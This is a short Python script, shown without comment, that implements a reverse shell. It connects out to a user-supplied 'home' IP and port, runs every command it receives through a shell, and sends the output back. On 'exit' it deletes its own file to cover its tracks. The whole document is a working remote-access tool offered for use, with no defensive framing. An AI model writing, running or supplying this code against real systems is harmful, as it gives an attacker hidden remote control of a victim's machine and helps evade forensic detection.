import socket
import subprocess
import os

home_ip = input("Enter the home IP address: ")
home_port = int(input("Enter the home port: "))

s = socket.socket()
s.connect((home_ip, home_port))

while True:
    command = s.recv(1024).decode()
    
    if command.lower() == "exit":
        break

    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        output = e.output
    s.send(output)

s.close()
os.remove(__file__)
os._exit(0)
